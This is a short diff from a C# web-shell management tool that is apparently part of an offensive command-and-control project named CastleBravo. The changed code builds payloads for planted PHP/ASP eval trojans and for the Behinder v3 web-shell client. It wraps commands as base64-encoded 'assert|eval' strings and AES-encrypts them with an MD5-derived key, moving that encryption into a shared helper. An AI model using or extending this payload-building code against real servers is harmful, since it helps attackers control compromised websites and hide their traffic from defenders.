@@ -610,35 +610,14 @@ namespace C2.Business.CastleBravo.WebShellTool
             string payload = task.TrojanType == "phpEval" ? php :
                              task.TrojanType == "aspEval" ? asp :
                              php;
-
-            if (task.ClientVersion == "三代冰蝎")
+            if (task.ClientVersion == "三代冰蝎") //目前只支持冰蝎php、aes加密报文
             {
-                string behinderPayload  = string.Format( "assert|eval(base64_decode('{0}'));", ST.EncodeBase64(payload));                
-                string b = Encrypt(behinderPayload, pass);
-                return b;
-                
+                string behinderPayload = string.Format("assert|eval(base64_decode('{0}'));", ST.EncodeBase64(payload));
+                return ClientSetting.Encrypt(behinderPayload, pass);
             }
-             
             return pass + "=" + payload;
         }
-        protected string Encrypt(string encryptStr, string key)
-        {
-            key = ST.GenerateMD5(key).Substring(0, 16);
-            var _aes = new AesCryptoServiceProvider();
-            _aes.BlockSize = 128;
-            _aes.KeySize = 128;
-            _aes.Key = Encoding.UTF8.GetBytes(key);
-            _aes.IV = (byte[])(object)new sbyte[16];
-            _aes.Padding = PaddingMode.PKCS7;
-            _aes.Mode = CipherMode.CBC;
-
-            var _crypto = _aes.CreateEncryptor(_aes.Key, _aes.IV);
-            byte[] encrypted = _crypto.TransformFinalBlock(Encoding.UTF8.GetBytes(encryptStr), 0, Encoding.UTF8.GetBytes(encryptStr).Length);
-
-            _crypto.Dispose();
-
-            return System.Convert.ToBase64String(encrypted);
-        }
+       
         private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
         {
             ClearAll();
